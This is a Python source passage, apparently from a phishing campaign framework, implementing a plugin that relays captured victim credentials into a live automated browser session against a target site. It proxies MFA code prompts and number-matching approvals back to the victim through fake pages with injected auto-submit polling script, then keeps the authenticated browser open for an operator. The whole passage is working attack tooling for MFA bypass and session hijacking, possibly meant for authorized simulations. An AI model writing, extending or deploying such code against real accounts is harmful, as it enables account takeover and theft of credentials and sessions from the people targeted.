    # -- Execute --

    def execute(self, context: Dict[str, Any], config: Dict[str, Any]) -> Dict[str, Any]:
        session_data = context.get('session', {})
        logger.info(
            f"[SyncProxy v{_PLUGIN_VERSION}] execute() called — "
            f"active_session_id={session_data.get('_sync_proxy_session_id')}, "
            f"form_keys={list(context.get('request', {}).get('form_data', {}).keys())}"
        )
        try:
            from workflows.sync_proxy_manager import get_sync_proxy_manager

            manager = get_sync_proxy_manager()
            if not manager:
                logger.error("SyncProxyManager not initialised")
                context['sync_proxy_success'] = False
                context['_stop_workflow'] = True
                context.pop('_response_redirect', None)
                context['_response_html'] = self._render_error_page("Sync proxy service unavailable")
                return context

            session_data = context.get('session', {})
            active_session_id = session_data.get('_sync_proxy_session_id')
            timeout = int(config.get('timeout', 30))

            # Resolve the active proxy session (if any)
            proxy_session = None
            if active_session_id:
                proxy_session = manager.get_session(active_session_id)
                if not proxy_session:
                    # Session expired or server restarted — clear stale ID and
                    # fall through to the initial path so the user doesn't see
                    # an error on their first attempt after a restart.
                    logger.warning(
                        f"Sync proxy session {active_session_id} not found (expired?), "
                        "clearing stale session and falling through to initial path"
                    )
                    self._set_session_key(context, '_sync_proxy_session_id', None)
                    active_session_id = None

            if proxy_session:
                # Continuation POST — MFA code / approval submission
                input_field = config.get('input_field_name', 'mfa_code')
                form_data = context.get('request', {}).get('form_data', {})
                user_input = form_data.get(input_field, '').strip()

                if not user_input:
                    # Re-render MFA page (user submitted empty)
                    context['sync_proxy_success'] = False
                    context['_stop_workflow'] = True
                    context.pop('_response_redirect', None)
                    context['_response_html'] = self._render_mfa_input_page(
                        config, context,
                        prompt_text='Please enter the verification code',
                        input_type='text',
                    )
                    return context

                result = proxy_session.execute_continue(user_input, timeout=timeout)
            else:
                # First POST — create session and execute initial
                credentials = context.get('captured_credentials')
                if not credentials or not isinstance(credentials, dict):
                    logger.warning("Sync Credential Proxy: No captured_credentials in context")
                    context['sync_proxy_success'] = False
                    context['_stop_workflow'] = True
                    context.pop('_response_redirect', None)
                    context['_response_html'] = self._render_error_page("No credentials captured")
                    return context

                target_url = config.get('target_url', '')
                if not target_url:
                    context['sync_proxy_success'] = False
                    context['_stop_workflow'] = True
                    context.pop('_response_redirect', None)
                    context['_response_html'] = self._render_error_page("No target URL configured")
                    return context

                browser_cfg = dict(config.get('browser_config') or {})
                if config.get('proxy'):
                    browser_cfg['proxy'] = config['proxy']

                proxy_session = manager.create_session(
                    target_url=target_url,
                    credentials=credentials,
                    config={
                        'timeout': timeout,
                        'ai_config': config.get('ai_config'),
                        'browser_config': browser_cfg,
                    },
                )
                # Multi-step logins need more time (AI detection at each step)
                result = proxy_session.execute_initial(timeout=timeout * 3)

            return self._process_result(result, proxy_session, context, config, manager)

        except Exception as e:
            logger.exception(f"Sync Credential Proxy failed: {e}")
            context['sync_proxy_success'] = False
            context['_stop_workflow'] = True
            context.pop('_response_redirect', None)
            error_msg = f"Proxy error: {e}"
            context['_response_html'] = self._render_error_page(error_msg)
            # Create job record so the failure is visible in logs
            try:
                self._create_job_record(context, config,
                                        {'status': 'failed', 'error': error_msg},
                                        'failed', error_message=error_msg)
            except Exception:
                pass
            return context

    # -- Result processing --

    def _process_result(self, result: dict, proxy_session, context: Dict[str, Any],
                        config: Dict[str, Any], manager) -> Dict[str, Any]:
        status = result.get('status', 'failed')
        logger.info(
            f"[SyncProxy v{_PLUGIN_VERSION}] _process_result status={status}, "
            f"cookies={len(result.get('cookies', []))}, "
            f"final_url={result.get('final_url', 'n/a')}"
        )

        # On continuation POSTs the Capture Credentials plugin re-ran with
        # MFA form data, so captured_credentials may be empty.  Fall back
        # to the proxy session's original credentials for the job record.
        if not context.get('captured_credentials'):
            context['captured_credentials'] = getattr(
                proxy_session, 'credentials', {}
            )

        if status == 'success':
            context['sync_proxy_success'] = True
            context['sync_proxy_result'] = result

            # Create CredentialProxyJob record
            self._create_job_record(context, config, result, 'completed')

            # Keep browser alive for operator interaction
            proxy_session.state = 'operator_available'
            proxy_session.last_activity = time.time()

            # Let the workflow continue — downstream nodes (e.g. Render Template,
            # Redirect) handle the response shown to the victim.

        elif status == 'needs_input':
            context['sync_proxy_success'] = False
            context['_stop_workflow'] = True
            context.pop('_response_redirect', None)  # kill any redirect — HTML must win
            context['_response_html'] = self._render_mfa_input_page(
                config, context,
                prompt_text=result.get('prompt_text', 'Enter verification code'),
                input_type=result.get('input_type', 'text'),
            )
            self._set_session_key(context, '_sync_proxy_session_id', proxy_session.session_id)
            self._create_job_record(context, config, result, 'mfa_prompted')

        elif status == 'needs_display':
            context['sync_proxy_success'] = False
            context['_stop_workflow'] = True
            context.pop('_response_redirect', None)
            context['_response_html'] = self._render_number_matching_page(
                config, context,
                display_value=result.get('display_value', ''),
                prompt_text=result.get('prompt_text', 'Approve the sign-in request'),
                session_id=proxy_session.session_id,
            )
            self._set_session_key(context, '_sync_proxy_session_id', proxy_session.session_id)
            self._create_job_record(context, config, result, 'mfa_prompted')

        else:  # failed / timeout
            context['sync_proxy_success'] = False
            context['_stop_workflow'] = True
            context.pop('_response_redirect', None)
            error_msg = result.get('error', 'Proxy failed')
            context['_response_html'] = self._render_error_page(error_msg)

            self._create_job_record(context, config, result, 'failed',
                                    error_message=error_msg)
            manager.remove_session(proxy_session.session_id)
            self._set_session_key(context, '_sync_proxy_session_id', None)

        return context

    # -- Session helper --

    @staticmethod
    def _set_session_key(context: Dict[str, Any], key: str, value):
        """Set or remove a key in the Flask session via _set_session."""
        existing = context.get('_set_session')
        if not isinstance(existing, dict):
            existing = {}
        if value is None:
            existing[key] = ''  # empty string clears it
        else:
            existing[key] = value
        context['_set_session'] = existing

    # -- DB record --

    def _create_job_record(self, context, config, result, status,
                           error_message=None):
        try:
            campaign_id = context.get('campaign', {}).get('id')
            if not campaign_id:
                logger.warning("Cannot create job record: no campaign_id in context")
                return
            # Keep result data as-is — screenshots are already size-limited
            # by _take_result_screenshot() (max ~500KB each)
            safe_result = dict(result) if result and isinstance(result, dict) else {}
            job = CredentialProxyJob(
                campaign_id=campaign_id,
                credentials=context.get('captured_credentials') or {},
                target_sites=[{'url': config.get('target_url', '')}],
                status=status,
                results=safe_result,
                error_message=error_message,
                ai_config=config.get('ai_config') or {},
                browser_config=config.get('browser_config') or {},
                automation_timeout=int(config.get('timeout', 30)),
                max_retries=0,
                proxy_mode='sync',
                completed_at=datetime.utcnow(),
            )
            db.session.add(job)
            db.session.commit()
            context['credential_proxy_job_id'] = job.id
            logger.info(f"Created sync credential proxy job {job.id}")
        except Exception as e:
            logger.exception(f"Failed to create sync proxy job record: {e}")
            db.session.rollback()

    # -- Page rendering --

    def _render_mfa_input_page(self, config, context, prompt_text: str,
                                input_type: str = 'text') -> str:
        source = config.get('mfa_template_source', 'auto')
        input_field = config.get('input_field_name', 'mfa_code')
        campaign_uid = context.get('campaign', {}).get('uid', '')
        form_action = f'/{campaign_uid}' if campaign_uid else '/'

        # Expose captured credentials as 'target' for template interpolation
        # so templates can use {{target.email}}, {{target.username}}, etc.
        creds = context.get('captured_credentials') or {}
        target = {k: v for k, v in creds.items() if k != 'password'}
        # Ensure 'email' is always available (may be stored as 'username')
        if 'email' not in target and 'username' in target:
            target['email'] = target['username']
        elif 'username' not in target and 'email' in target:
            target['username'] = target['email']

        template_vars = {
            'mfa_prompt_text': prompt_text,
            'mfa_field_name': input_field,
            'form_action': form_action,
            'input_type': input_type,
            'target': target,
        }

        if source == 'custom':
            return self._render_custom_template(
                config.get('mfa_custom_template', ''), template_vars, context
            )
        elif source == 'library':
            return self._render_library_template(
                config.get('mfa_template_id'), template_vars, context
            )
        else:
            return self._render_auto_mfa_page(template_vars)

    def _render_number_matching_page(self, config, context, display_value: str,
                                      prompt_text: str, session_id: str) -> str:
        source = config.get('mfa_template_source', 'auto')
        input_field = config.get('input_field_name', 'mfa_code')
        campaign_uid = context.get('campaign', {}).get('uid', '')
        form_action = f'/{campaign_uid}' if campaign_uid else '/'
        poll_url = f'/{campaign_uid}/proxy-status/{session_id}' if campaign_uid else f'/proxy-status/{session_id}'

        # Expose captured credentials as 'target' for template interpolation
        creds = context.get('captured_credentials') or {}
        target = {k: v for k, v in creds.items() if k != 'password'}
        # Ensure 'email' is always available (may be stored as 'username')
        if 'email' not in target and 'username' in target:
            target['email'] = target['username']
        elif 'username' not in target and 'email' in target:
            target['username'] = target['email']

        template_vars = {
            'mfa_prompt_text': prompt_text,
            'mfa_field_name': input_field,
            'form_action': form_action,
            'display_value': display_value,
            'poll_url': poll_url,
            'session_id': session_id,
            'target': target,
        }

        if source == 'custom':
            return self._render_custom_template(
                config.get('mfa_custom_template', ''), template_vars, context
            )
        elif source == 'library':
            return self._render_library_template(
                config.get('mfa_template_id'), template_vars, context
            )
        else:
            return self._render_auto_number_matching_page(template_vars)

    @staticmethod
    def _render_jinja(template_html: str, template_vars: dict, context: dict) -> str:
        """Render an MFA prompt template in a sandboxed Jinja2 env.

        Variable values are never re-parsed (no second pass), and parse-time
        Python escape gadgets raise SecurityError. On any render failure return
        a static error page rather than serving a half-rendered template.
        """
        merged = {**context, **template_vars}
        try:
            return render_sandboxed(template_html, merged)
        except Exception as e:
            logger.warning(f"Sandboxed Jinja2 render failed: {e}")
            return (
                "<html><body><h1>Template error</h1>"
                "<p>The MFA prompt template could not be rendered.</p></body></html>"
            )

    @staticmethod
    def _render_custom_template(template_html: str, template_vars: dict,
                                 context: dict) -> str:
        try:
            html = SyncCredentialProxyPlugin._render_jinja(template_html, template_vars, context)
            # Inject polling script for number-matching pages
            html = SyncCredentialProxyPlugin._inject_poll_script(html, template_vars)
            return html
        except Exception as e:
            logger.error(f"Custom MFA template rendering failed: {e}")
            return SyncCredentialProxyPlugin._render_auto_mfa_page(template_vars)

    @staticmethod
    def _render_library_template(template_id, template_vars: dict,
                                  context: dict) -> str:
        try:
            if not template_id:
                return SyncCredentialProxyPlugin._render_auto_mfa_page(template_vars)
            template = Template.query.get(template_id)
            if not template or not template.template_html:
                logger.warning(f"MFA template {template_id} not found")
                return SyncCredentialProxyPlugin._render_auto_mfa_page(template_vars)
            html = SyncCredentialProxyPlugin._render_jinja(
                template.template_html, template_vars, context
            )
            # Inject polling script for number-matching pages
            html = SyncCredentialProxyPlugin._inject_poll_script(html, template_vars)
            return html
        except Exception as e:
            logger.error(f"Library MFA template rendering failed: {e}")
            return SyncCredentialProxyPlugin._render_auto_mfa_page(template_vars)

    @staticmethod
    def _inject_poll_script(html: str, template_vars: dict) -> str:
        """Inject approval-polling JS into custom/library templates for number-matching pages.
        Only injects when poll_url is present (needs_display flow).
        Skips injection if the template already references the poll URL or path,
        so authors who write their own polling don't get a duplicate loop."""
        poll_url = template_vars.get('poll_url')
        if not poll_url:
            return html  # not a number-matching page

        # Idempotent: if the template already polls, skip injection.
        if poll_url in html or 'proxy-status/' in html:
            return html

        import html as html_mod
        form_action = html_mod.escape(template_vars.get('form_action', '/'))
        field_name = html_mod.escape(template_vars.get('mfa_field_name', 'mfa_code'))
        poll_safe = html_mod.escape(poll_url)

        script = (
            f'\n<!-- sync proxy approval polling -->'
            f'\n<form id="_sp_approval_form" method="POST" action="{form_action}" style="display:none">'
            f'\n  <input type="hidden" name="{field_name}" value="approved">'
            f'\n</form>'
            f'\n<script>'
            f'\n(function(){{'
            f'\n  var pollUrl = "{poll_safe}";'
            f'\n  var iv = setInterval(function(){{'
            f'\n    fetch(pollUrl, {{credentials:"same-origin"}})'
            f'\n      .then(function(r){{return r.json();}})'
            f'\n      .then(function(d){{'
            f'\n        if(d.status==="approved"){{clearInterval(iv);document.getElementById("_sp_approval_form").submit();}}'
            f'\n        else if(d.status==="failed"||d.status==="timeout"){{clearInterval(iv);}}'
            f'\n      }}).catch(function(){{}});'
            f'\n  }}, 3000);'
            f'\n}})();'
            f'\n</script>'
        )

        # Insert before </body> if present, otherwise append
        if '</body>' in html.lower():
            import re
            html = re.sub(r'(</body>)', script + r'\1', html, count=1, flags=re.IGNORECASE)
        else:
            html += script

        return html

